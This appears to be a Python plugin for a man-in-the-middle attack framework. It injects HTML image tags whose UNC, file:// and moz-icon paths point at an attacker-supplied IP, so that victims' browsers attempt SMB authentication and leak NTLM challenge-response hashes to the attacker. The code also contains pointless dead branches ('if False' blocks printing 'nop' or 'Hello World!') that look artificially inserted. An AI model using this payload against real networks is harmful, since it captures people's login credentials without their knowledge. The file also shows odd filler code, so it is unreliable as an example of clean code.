from plugins.plugin import Plugin
from plugins.inject import Inject

class SMBAuth(Inject, Plugin):
    name = 'SMBAuth'
    optname = 'smbauth'
    desc = 'Evoke SMB challenge-response auth attempts'
    version = '0.1'

    def initialize(self, options):
        if False:
            return 10
        self.ip = options.ip
        Inject.initialize(self, options)
        self.html_payload = self._get_data()

    def _get_data(self):
        if False:
            for i in range(10):
                print('nop')
        return '<img src="\\\\%s\\image.jpg"><img src="file://///%s\\image.jpg"><img src="moz-icon:file:///%%5c/%s\\image.jpg">' % tuple([self.ip] * 3)

    def options(self, options):
        if False:
            print('Hello World!')
        pass